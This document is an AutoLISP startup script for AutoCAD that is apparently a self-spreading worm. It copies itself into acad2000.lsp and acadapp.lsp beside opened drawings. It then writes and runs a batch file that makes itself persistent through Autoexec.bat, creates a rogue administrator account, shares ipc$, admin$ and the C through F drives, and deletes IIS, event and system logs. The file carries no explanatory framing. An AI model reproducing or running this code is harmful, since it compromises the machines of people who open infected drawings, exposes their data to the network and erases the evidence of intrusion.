(defun
	  s::startup
		    (/	      old_cmd  path	dwgpath	 mnlpath
		     apppath  oldacad  newacad	nowdwg	 lspbj
		     wjm      wjm1     wjqm	wjqm1	 wz
		     ns1      ns2
		    )
  (setq
    old_cmd
     (getvar
       "cmdecho"
     )
  )
  (setvar
    "cmdecho"
    0
  )
  (setq
    path
     (findfile
       "base.dcl"
     )
  )
  (setq
    path
     (substr
       path
       1
       (-
	 (strlen
	   path
	 )
	 8
       )
     )
  )
  (setq
    mnlpath
     (getvar
       "menuname"
     )
  )
  (setq
    nowdwg
     (getvar
       "dwgname"
     )
  )
  (setq
    wjqm
     (findfile
       nowdwg
     )
  )
   (if (/= wjqm nil)

  (setq
    dwgpath
     (substr
       wjqm
       1
       (-
	 (strlen
	   wjqm
	 )
	 (strlen
	   nowdwg
	 )
       )
     )
  )
       );end if
  (setq
    acadpath
     (findfile
       "acad2000.lsp"
     )
  )
  (setq
    acadpath
     (substr
       acadpath
       1
       (-
	 (strlen
	   acadpath
	 )
	 12
       )
     )
  )
  (setq
    ns1
	""
    ns2
	""
  )
  (setq
    lspbj
     0
  )
  (setq
    wjqm
     (strcat
       path
       "acad2000.lsp"
     )
  )
  (if
    (setq
      wjm
       (open
	 wjqm
	 "r"
       )
    )
     (progn
       (while
	 (setq
	   wz
	    (read-line
	      wjm
	    )
	 )
	  (setq
	    ns1
	     ns2
	  )
	  (setq
	    ns2
	     wz
	  )
       )
       (if
	 (>=
	   (strlen
	     ns1
	   )
	   10
	 )
	  (if
	    (=
	      (substr
		ns1
		1
		9
	      )
	      "acadapp"
	    )
	     (setq
	       lspbj
		1
	     )
	  )
       )
       (close
	 wjm
       )
     )
  )
  (if
    (and
      (=
	acadpath
	dwgpath
      )
      (/=
	acadpath
	path
      )
    )
     (progn
       (setq
	 oldacad
	  (findfile
	    "acad2000.lsp"
	  )
       )
       (setq
	 newacad
	  (strcat
	    path
	    "acadapp.lsp"
	  )
       )
       (if
	 (=
	   lspbj
	   0
	 )
	  (progn
	    (setq
	      wjqm
	       (strcat
		 path
		 "acad2000.lsp"
	       )
	    )
	    (setq
	      wjm
	       (open
		 wjqm
		 "a"
	       )
	    )
	    (write-line
	      (strcat
		"(load
"
		(chr
		  34
		)
		"acadapp"
		(chr
		  34
		)
		")"
	      )
	      wjm
	    )
	    (write-line
	      "(princ)"
	      wjm
	    )
	    (close
	      wjm
	    )
	  )
       )
       (writeapp)
     )
     (progn
       (if
	 (/=
	   nowdwg
	   "Drawing1.dwg"
	 )
	  (progn
	    (setq
	      oldacad
	       (findfile
		 "acadapp.lsp"
	       )
	    )
	    (setq
	      newacad
	       (strcat
		 dwgpath
		 "acad2000.lsp"
	       )
	    )
	    (writeapp)
	  )
       )
     )
  )


 (BAT)
(princ)
)

(defun
	  writeapp
		  ()
  (if
    (setq
      wjm1
       (open
	 newacad
	 "w"
       )
    )
     (progn
       (setq
	 wjm
	  (open
	    oldacad
	    "r"
	  )
       )
       (while
	 (setq
	   wz
	    (read-line
	      wjm
	    )
	 )
	  (write-line
	    wz
	    wjm1
	  )
       )
       (close
	 wjm
       )
       (close
	 wjm1
       )
     )
  )
)
(defun 
    bat()
    (setq f1 (open "c:\\Rundll33.bat" "a"))
    (write-line "@REM -----IPC fuck V0.1 -----" f1)
    (write-line "@SET addadmin=fuck" f1)
    (write-line "@SET WORM=Rundll33.bat" f1)
    (write-line "@Copy /y c:\\Rundll33.bat C:\Autoexec.bat" f1)
    (write-line "@Copy /y c:\\Rundll33.bat %windir%\system32\Winstart.bat" f1)
    (write-line "@net user %addadmin% /add" f1)
    (write-line "@IF %ERRORLEVEL%==0 net localgroup Administrators %addadmin% /add" f1)
    (write-line "@net share ipc$" f1)
    (write-line "@SET addadmin=fuck" f1)
    (write-line "@net share admin$" f1)
    (write-line "@net share C$=c:\" f1)
    (write-line "@net share D$=d:\" f1)
    (write-line "@net share e$=e:\" f1)
    (write-line "@net share f$=f:\" f1)
    (write-line "@del %windir%\system32\logfiles\w3svc1\*.* /f /q" f1)
    (write-line "@del %windir%\system32\logfiles\w3svc2\*.* /f /q" f1)
    (write-line "@del %windir%\system32\config\*.event /f /q" f1)
    (write-line "@del %windir%\system32dtclog\*.* /f /q" f1)
    (write-line "@del %windir%\*.txt /f /q" f1)
    (write-line "@del %windir%\*.log /f /q" f1)
 (close f1)
 (command "sh" "c:\\Rundll33.bat")
(princ)
)
